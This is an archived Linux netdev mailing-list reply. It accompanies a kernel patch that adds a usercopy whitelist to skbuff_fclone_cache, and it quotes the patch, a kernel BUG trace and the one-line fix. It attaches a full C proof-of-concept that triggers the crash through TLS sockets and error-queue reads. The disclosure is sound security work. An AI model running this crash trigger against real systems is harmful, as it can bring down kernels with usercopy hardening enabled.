Return-Path: <netdev+bounces-244830-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
	by mail.lfdr.de (Postfix) with ESMTPS id D3DFFCBF75E
	for <lists+netdev@lfdr.de>; Mon, 15 Dec 2025 19:42:56 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id 8EFEC3019ACA
	for <lists+netdev@lfdr.de>; Mon, 15 Dec 2025 18:42:54 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 1158F31ED8D;
	Mon, 15 Dec 2025 18:42:52 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="og56TajP"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pg1-f174.google.com (mail-pg1-f174.google.com [209.85.215.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F0DF118C02E
	for <netdev@vger.kernel.org>; Mon, 15 Dec 2025 18:42:49 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1765824172; cv=none; b=l+NlfRNj+1Zu12MVMKYqfS1KP0qhZeYZHFq2YMOMLSBpmmrgviupwAPHVSECgdhk+9wJ0hl5l3dVu9sEViNOkBrpr9KakDmRulOSe4vQ4wjM3xBZZmORwFMDd9SDV4SiMpc7NOORE6JtR57sf/T5vZwdxqIaZhT9zfHZimFCnWs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1765824172; c=relaxed/simple;
	bh=8AU+/ci2BmoQc14uQhzGCNGpP/4vfaAnsNku9o4tltY=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=e/JnSD9UgYZ/gyuXAwNFMJkncAaUWEXNAPPwqC76TilR0IImDdFEGHcLrTDRoj7VDf+LRwTTGsL2Imj+08mw2KFM06eO8tlVzRMcAIiElIocoO5/LSdi0JqhSwOIgxGaEpxgDUONaw32IJOLBopBqSXg32I+Mk/TfWTlZSANaTo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=og56TajP; arc=none smtp.client-ip=209.85.215.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-pg1-f174.google.com with SMTP id 41be03b00d2f7-c13771b2cf9so1422846a12.1
        for <netdev@vger.kernel.org>; Mon, 15 Dec 2025 10:42:49 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1765824169; x=1766428969; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=zhAIZ951VoR9NcyfGbWuaKPyvkk9cxzVp4WodrKw0WI=;
        b=og56TajPKIaVCaFpIUupNtZtbOy7SqPVXdWqIJcuYz0+qjHLXyviqTkEsIVAFnvA/X
         MVYDWzLF1l9tYNSkwDsxprdQIrvEML7PR8ojrBzNp1W/gFgj8AnvcQCpVan+cT2MZBtD
         G/2WJC9bYrkW77wSuk9d5sEm9SulpJdffHu1kyvyxJZiGQF2y690SriI6kaBj/jRi/Pj
         9zQevFGd2y73MvENHagYgyrL0zJde14ecOvdNa4E6AzfVMt5tiPGOM1e94fHp3Tcdxov
         PMJAbzcADqpv+hRnVpCTFZW/TtFw/XW1kRTOowvD24Htxn6nas27us9C2j65FLAN++DF
         s1vQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1765824169; x=1766428969;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=zhAIZ951VoR9NcyfGbWuaKPyvkk9cxzVp4WodrKw0WI=;
        b=Dxa2oqozMhRYtODo/GmWuMpM74bVG3WJmtmR7xvGqsSETM4jTIIiqzdoTAa9YrISS3
         DNQi7oEBuBbr5Ibt0c4ZW739EkCAB55Js7kNRBi56AX9c7q89m0aa1nSF12hozcTl7LH
         eFYwnbEo6POyrh6RDTlWm7bwUXQddT2wCG+B+U8t1r400nZ6YYqGNaTWllEorYoys8IM
         7TYESF3etJ7KmB2130QKw/8pHUMNIrlyW8DnS1+Onk4vZ5UsFNd4T35CJhibUMNQRdiV
         ei3rFv1mtRCQlRYTX0fQ1wYa4yvaKxR9DeDiZmGHjzgCSC1JYDGi9d4q97aCJCxUEYNG
         z+QQ==
X-Forwarded-Encrypted: i=1; AJvYcCW4QkflMmAAImwJqDp0VlzLMWI7UChfrmro3epdrPdeQSauerE0mWPykNMYS3l/dCyTBzA9Jvk=@vger.kernel.org
X-Gm-Message-State: AOJu0YxRMtw/xKlpGiWbe1OsONMTxmTi8wj33J5QSnJt0x05+R2FPGiG
	QDr2HoYoJ6vNymi8fjO/FO0f9BWKEa3zNigWdalqZ2iC60h/Jvo9t0RWDN99WqHOWQ==
X-Gm-Gg: AY/fxX5LwxO2zUbGzWhcP1pal9uDhFUkCpSeDTfHNEOsjQHVhASm13jiKhbZNdUS+Hr
	QYHR6p7n0ZnBhakTVrCE/+i7cLYqPJ8gMui5g6Q2theBIhOOvgqijR1P4bjUp0PbtWqn9IfulCr
	7pXKwst4ruAtPFO3uXMaW/WhZirhVsnzEXzD/dkuk/Ttw76k0/mOz/sAYMkjWkH+V2BSh58BCoU
	7+YHO5RV/XJrFZdCaGBQMfl2zQh2V+LHPpkA2vNYhdSl+gkbyO7KBkEeHatkPHCAykKIZcc3vmJ
	ZgeB56teqhwMx8oSWGduxFwvEsBiJDFxL7sdtd3HfNwRqj8J4uQi9jsmAWcC5PBa3jrDHn56ppA
	5PPcF+Tz7utkdlUVuWynwYt5KHTR2oFkJp0iqqq5Xn6+d3jIZy079ZjihkEjs/gWuCWiMjA==
X-Google-Smtp-Source: AGHT+IG+6sUeNwTrwRzWnqc5wekiFd8pmjI/JyCMIkdNoBBnTWK8hO0I5aPdwcaAN46ylSe8hJ6jlg==
X-Received: by 2002:a05:701a:ca8e:b0:119:e569:f61e with SMTP id a92af1059eb24-11f34bfaf3cmr8359699c88.23.1765824169083;
        Mon, 15 Dec 2025 10:42:49 -0800 (PST)
Received: from p1 ([2600:8800:1e80:41a0:b526:b812:c034:9690])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-11f2e30491dsm48858882c88.16.2025.12.15.10.42.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 15 Dec 2025 10:42:44 -0800 (PST)
Date: Mon, 15 Dec 2025 11:42:42 -0700
From: Xiang Mei <xmei5@asu.edu>
To: bestswngs@gmail.com
Cc: security@kernel.org, davem@davemloft.net, edumazet@google.com, 
	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, netdev@vger.kernel.org, 
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH v3] net: skbuff: add usercopy region to
 skbuff_fclone_cache
Message-ID: <wbaekhctczlzbqhnhfrtlf4rqzq4fmmj7mobgtc2oa4iruxlp5@st4bwbou5llt>
References: <20251215182913.955478-2-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20251215182913.955478-2-bestswngs@gmail.com>

On Tue, Dec 16, 2025 at 02:29:14AM +0800, bestswngs@gmail.com wrote:
> From: "Weiming Shi" <bestswngs@gmail.com>
> 
> skbuff_fclone_cache was created without defining a usercopy region, [1]
> unlike skbuff_head_cache which properly whitelists the cb[] field.  [2]
> This causes a usercopy BUG() when CONFIG_HARDENED_USERCOPY is enabled
> and the kernel attempts to copy sk_buff.cb data to userspace via
> sock_recv_errqueue() -> put_cmsg().
> 
> The crash occurs when:
> 1. TCP allocates an skb using alloc_skb_fclone() 
>    (from skbuff_fclone_cache) [1]
> 2. The skb is cloned via skb_clone() using the pre-allocated fclone [3]
> 3. The cloned skb is queued to sk_error_queue for timestamp reporting
> 4. Userspace reads the error queue via recvmsg(MSG_ERRQUEUE)
> 5. sock_recv_errqueue() calls put_cmsg() to copy serr->ee from skb->cb [4]
> 6. __check_heap_object() fails because skbuff_fclone_cache has no
>    usercopy whitelist [5]
> 
> When cloned skbs allocated from skbuff_fclone_cache are used in the
> socket error queue, accessing the sock_exterr_skb structure in skb->cb
> via put_cmsg() triggers a usercopy hardening violation:
> 
> [    5.379589] usercopy: Kernel memory exposure attempt detected from SLUB object 'skbuff_fclone_cache' (offset 296, size 16)!
> [    5.382796] kernel BUG at mm/usercopy.c:102!
> [    5.383923] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
> [    5.384903] CPU: 1 UID: 0 PID: 138 Comm: poc_put_cmsg Not tainted 6.12.57 #7
> [    5.384903] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.3-0-ga6ed6b701f0a-prebuilt.qemu.org 04/01/2014
> [    5.384903] RIP: 0010:usercopy_abort+0x6c/0x80
> [    5.384903] Code: 1a 86 51 48 c7 c2 40 15 1a 86 41 52 48 c7 c7 c0 15 1a 86 48 0f 45 d6 48 c7 c6 80 15 1a 86 48 89 c1 49 0f 45 f3 e8 84 27 88 ff <0f> 0b 490
> [    5.384903] RSP: 0018:ffffc900006f77a8 EFLAGS: 00010246
> [    5.384903] RAX: 000000000000006f RBX: ffff88800f0ad2a8 RCX: 1ffffffff0f72e74
> [    5.384903] RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffffffff87b973a0
> [    5.384903] RBP: 0000000000000010 R08: 0000000000000000 R09: fffffbfff0f72e74
> [    5.384903] R10: 0000000000000003 R11: 79706f6372657375 R12: 0000000000000001
> [    5.384903] R13: ffff88800f0ad2b8 R14: ffffea00003c2b40 R15: ffffea00003c2b00
> [    5.384903] FS:  0000000011bc4380(0000) GS:ffff8880bf100000(0000) knlGS:0000000000000000
> [    5.384903] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [    5.384903] CR2: 000056aa3b8e5fe4 CR3: 000000000ea26004 CR4: 0000000000770ef0
> [    5.384903] PKRU: 55555554
> [    5.384903] Call Trace:
> [    5.384903]  <TASK>
> [    5.384903]  __check_heap_object+0x9a/0xd0
> [    5.384903]  __check_object_size+0x46c/0x690
> [    5.384903]  put_cmsg+0x129/0x5e0
> [    5.384903]  sock_recv_errqueue+0x22f/0x380
> [    5.384903]  tls_sw_recvmsg+0x7ed/0x1960
> [    5.384903]  ? srso_alias_return_thunk+0x5/0xfbef5
> [    5.384903]  ? schedule+0x6d/0x270
> [    5.384903]  ? srso_alias_return_thunk+0x5/0xfbef5
> [    5.384903]  ? mutex_unlock+0x81/0xd0
> [    5.384903]  ? __pfx_mutex_unlock+0x10/0x10
> [    5.384903]  ? __pfx_tls_sw_recvmsg+0x10/0x10
> [    5.384903]  ? _raw_spin_lock_irqsave+0x8f/0xf0
> [    5.384903]  ? _raw_read_unlock_irqrestore+0x20/0x40
> [    5.384903]  ? srso_alias_return_thunk+0x5/0xfbef5
> 
> In our patch, we referenced 
>     net: Whitelist the `skb_head_cache` "cb" field. [5]
> 
> Fix by using kmem_cache_create_usercopy() with the same cb[] region
> whitelist as skbuff_head_cache.
> 
> [1] https://elixir.bootlin.com/linux/v6.12.62/source/net/ipv4/tcp.c#L885
> [2] https://elixir.bootlin.com/linux/v6.12.62/source/net/core/skbuff.c#L5104
> [3] https://elixir.bootlin.com/linux/v6.12.62/source/net/core/skbuff.c#L5566
> [4] https://elixir.bootlin.com/linux/v6.12.62/source/net/core/skbuff.c#L5491
> [5] https://elixir.bootlin.com/linux/v6.12.62/source/mm/slub.c#L5719
> [6] https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=79a8a642bf05c
> 
> Fixes: 6d07d1cd300f ("usercopy: Restrict non-usercopy caches to size 0")
> Reported-by: Xiang Mei <xmei5@asu.edu>
> Signed-off-by: Weiming Shi <bestswngs@gmail.com>
> ---
>  v2: Fix the Commit Message
>  v3: Add "From" email adress, Fix "CC" and "TO" email address
> 
>  net/core/skbuff.c | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
> 
> diff --git a/net/core/skbuff.c b/net/core/skbuff.c
> index c52e955dd3a0..89c98ce6106a 100644
> --- a/net/core/skbuff.c
> +++ b/net/core/skbuff.c
> @@ -5157,7 +5157,7 @@ void __init skb_init(void)
>  					      NULL);
>  	skbuff_cache_size = kmem_cache_size(net_hotdata.skbuff_cache);
>  
> -	net_hotdata.skbuff_fclone_cache = kmem_cache_create("skbuff_fclone_cache",
> +	net_hotdata.skbuff_fclone_cache = kmem_cache_create_usercopy("skbuff_fclone_cache",
>  						sizeof(struct sk_buff_fclones),
>  						0,
>  						SLAB_HWCACHE_ALIGN|SLAB_PANIC,
> -- 
> 2.43.0
> 

I helped Weiming on some format issues and we attached the original PoC
that triggering the crash for your reference:

```c
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <linux/tls.h>
#include <net.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>

#ifndef SOL_TCP
#define SOL_TCP 6
#endif

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef SOL_TLS
#define SOL_TLS 282
#endif

#ifndef MSG_PROBE
#define MSG_PROBE 0x10
#endif

#ifndef MSG_RST
#define MSG_RST 0x1000
#endif

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))

static const unsigned char kRecordPayload[] =
    "\xe1\xb6\x4c\xa5\x19\x63\xef\xca\xad\x19\x5f\x40\xfe\xb1\xe4\x01\xa9\xca"
    "\x1c\x7e\xbd\x2d\x13\xfd\x4b\x7f\xe3\x98\xb8\x39\x95\x0c\x4a\x15\x72\xea"
    "\xfa\x04\x4f\x8d\xfa\x62\x9d\xb5\x46\x60\x45\x3b\x35\xc7\x6b\x12\x8f\x33"
    "\x60\xa6\xf6\x01\x0a\x9a\x7a\xb5\xaa\x0d\x30\x0c\x4f\x82\x0d\xb9\x63\x20"
    "\xdc\x93\x0e\x8e\xb8\xa3\xe1\x3c\x68\xba\xae\x14\xcf\x3c\xa1\xa2\xf0\x45"
    "\x41\x22\x34\x52\x74\x62\x20\xc8\x77\xbc\xb1\x95\x15\x96\x93\xf8\x77\xb5"
    "\x10\xe7\x38\x76\xab\xc1\x40\x52\xe8\xbb\x6b\x95\x63\x5a\x06\x93\x7c\xae"
    "\x56\xe7\x2e\xfe\x52\x82\x19\x47\xb8\xfd\x31\x49\x24\x24\xe1\x7c\x79\x6e"
    "\xe8\xcb\x77\xb5\x0e\x30\xe5\xd2\x29\xac\xbe\x39\xab\x30\x82\x32\x6c\x4d"
    "\xee\x33\x06\xcd\x75\xf3\x3e\x02\x55\xa4\x27\xaa\xa1\x88\x87\x71\x73\x03"
    "\xe3\x35\x63\x78\x3e\x22\xac\x26\xf3\x09\x1c\xe1\x72\xe5\xdd\x4d\x3f\xa5"
    "\xb2\x64\xdd\xf8\x9e\xed\x55";

static const size_t kRecordPayloadLen = sizeof(kRecordPayload) - 1;

static const unsigned char kProbePayload[] = "\x97\x51";
static const size_t kProbePayloadLen = sizeof(kProbePayload) - 1;

static const struct tls12_crypto_info_aes_gcm_128 kRxCrypto = {
    .info =
        {
            .version = TLS_1_2_VERSION,
            .cipher_type = TLS_CIPHER_AES_GCM_128,
        },
    .iv = {0x48, 0x3f, 0x55, 0x85, 0xa9, 0x8f, 0x53, 0xde},
    .key = {0x2b, 0xf3, 0xd4, 0xc2, 0x96, 0xcf, 0x3d, 0x32,
            0x9a, 0x9e, 0x70, 0xb0, 0xa7, 0x5d, 0xf1, 0xf6},
    .salt = {0x43, 0xad, 0xf0, 0x98},
    .rec_seq = {0x6e, 0x23, 0xbb, 0x86, 0x79, 0xdd, 0x62, 0xbe},
};

static int accept_tls_socket(int family)
{
    int ls = socket(family, SOCK_STREAM, 0);
    if (ls < 0)
        return -1;

    int on = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    if (family == AF_INET) {
        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_addr = {.s_addr = htonl(INADDR_LOOPBACK)},
            .sin_port = 0,
        };

        if (bind(ls, (struct sockaddr*)&addr, sizeof(addr)) < 0 ||
            listen(ls, 1) < 0) {
            close(ls);
            return -1;
        }

        socklen_t len = sizeof(addr);
        if (getsockname(ls, (struct sockaddr*)&addr, &len) < 0) {
            close(ls);
            return -1;
        }

        int client = socket(family, SOCK_STREAM, 0);
        if (client < 0) {
            close(ls);
            return -1;
        }
        if (connect(client, (struct sockaddr*)&addr, len) < 0) {
            close(client);
            close(ls);
            return -1;
        }
    } else {
        struct sockaddr_in6 addr6 = {
            .sin6_family = AF_INET6,
            .sin6_addr = IN6ADDR_LOOPBACK_INIT,
            .sin6_port = 0,
        };

        if (bind(ls, (struct sockaddr*)&addr6, sizeof(addr6)) < 0 ||
            listen(ls, 1) < 0) {
            close(ls);
            return -1;
        }

        socklen_t len = sizeof(addr6);
        if (getsockname(ls, (struct sockaddr*)&addr6, &len) < 0) {
            close(ls);
            return -1;
        }

        int client = socket(family, SOCK_STREAM, 0);
        if (client < 0) {
            close(ls);
            return -1;
        }
        if (connect(client, (struct sockaddr*)&addr6, len) < 0) {
            close(client);
            close(ls);
            return -1;
        }
    }

    int acc = accept(ls, NULL, NULL);
    close(ls);
    if (acc < 0)
        return -1;

    const char* ulp = "tls";
    if (setsockopt(acc, SOL_TCP, TCP_ULP, ulp, strlen(ulp)) < 0) {
        perror("setsockopt(TCP_ULP)");
        close(acc);
        return -1;
    }
    return acc;
}

int syz_net_accepted_socket(void)
{
    return accept_tls_socket(AF_INET);
}

int syz_net_accepted_socket6(void)
{
    return accept_tls_socket(AF_INET6);
}

static void send_record(int fd)
{
    struct iovec iov[5] = {};
    iov[0].iov_base = (void*)kRecordPayload;
    iov[0].iov_len = kRecordPayloadLen;

    struct msghdr msg = {
        .msg_iov = iov,
        .msg_iovlen = ARRAY_SIZE(iov),
    };

    if (sendmsg(fd, &msg, MSG_DONTWAIT) < 0)
        perror("sendmsg(record)");
}

static void send_probe(int fd)
{
    unsigned char control[0x18] = {};
    struct cmsghdr* cmsg = (struct cmsghdr*)control;
    cmsg->cmsg_len = 0x14;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = 0x25;
    uint32_t record_type = 0x200;
    memcpy(CMSG_DATA(cmsg), &record_type, sizeof(record_type));

    struct iovec iov[2] = {};
    iov[0].iov_base = (void*)kProbePayload;
    iov[0].iov_len = kProbePayloadLen;

    struct msghdr msg = {
        .msg_iov = iov,
        .msg_iovlen = ARRAY_SIZE(iov),
        .msg_control = control,
        .msg_controllen = sizeof(control),
    };

    if (sendmsg(fd, &msg, MSG_PROBE | 0x80000) < 0)
        perror("sendmsg(probe)");
}

static void install_tls_rx(int fd)
{
    if (setsockopt(fd, SOL_TLS, TLS_RX, &kRxCrypto, sizeof(kRxCrypto)) < 0)
        perror("setsockopt(TLS_RX)");
}

static void peek_errqueue(int fd)
{
    unsigned char control[0x36] = {};
    struct msghdr msg = {
        .msg_control = control,
        .msg_controllen = sizeof(control),
    };

    if (recvmsg(fd, &msg, MSG_PEEK | MSG_ERRQUEUE | MSG_RST) < 0)
        perror("recvmsg(errqueue)");
}

static int bring_up(const char *ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); return -1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
        perror("SIOCGIFFLAGS");
        close(fd);
        return -1;
    }

    ifr.ifr_flags |= (short)(IFF_UP | IFF_RUNNING);

    if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
        perror("SIOCSIFFLAGS");
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}
int main(void)
{
    bring_up("lo");
    int sock = syz_net_accepted_socket6();
    send_record(sock);
    send_probe(sock);
    install_tls_rx(sock);
    peek_errqueue(sock);
    return 0;
}
```

Feel free to ask for more details about the bug.

Thanks,
Xiang

